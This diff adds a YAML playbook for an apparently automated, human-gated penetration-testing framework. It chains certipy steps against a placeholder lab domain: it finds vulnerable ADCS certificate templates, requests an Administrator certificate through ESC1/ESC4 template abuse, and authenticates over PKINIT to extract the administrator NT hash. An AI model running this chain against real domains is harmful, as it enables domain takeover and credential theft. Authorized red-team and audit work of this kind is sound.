@@ -1,0 +1,49 @@
+version: 1
+name: "Generic Active Directory Certificate Services (ADCS) Audit & Escalation"
+
+nodes:
+  - id: "ADCS-01-ENUM"
+    phase: 2.0
+    title: "Audit CAs & Certificate Templates (ESC1-ESC13 Discovery)"
+    path: "direct"
+    beachheads: ["windows", "linux"]
+    intent: "certipy.find"
+    intent_args:
+      target: "ca01.example.lab"
+      domain: "example.lab"
+      vulnerable: true
+    produces_cred: "adcs_vulnerable_templates"
+    success_marker: "ADCS_01_ENUM_OK"
+
+  - id: "ADCS-02-REQUEST"
+    phase: 2.5
+    title: "Request Certificate for Target Principal (ESC1/ESC4 Template Abuse)"
+    path: "direct"
+    beachheads: ["windows", "linux"]
+    requires_cred: "adcs_vulnerable_templates"
+    intent: "certipy.req"
+    intent_args:
+      ca: "EXAMPLE-CA"
+      template: "Vulnerable-Template"
+      target: "ca01.example.lab"
+      domain: "example.lab"
+      upn: "Administrator@example.lab"
+    produces_cred: "admin_cert_pfx"
+    hitl_gate: "ticket"
+    success_marker: "ADCS_02_REQUEST_OK"
+
+  - id: "ADCS-03-AUTH"
+    phase: 3.0
+    title: "Authenticate with PKINIT PFX Certificate to Extract NT Hash (UnPAC)"
+    path: "direct"
+    beachheads: ["windows", "linux"]
+    requires_cred: "admin_cert_pfx"
+    intent: "certipy.auth"
+    intent_args:
+      pfx: "admin.pfx"
+      domain: "example.lab"
+      dc_ip: "192.168.1.10"
+      unpac: true
+    produces_cred: "administrator_nt_hash"
+    hitl_gate: "ticket"
+    success_marker: "ADCS_03_AUTH_OK"
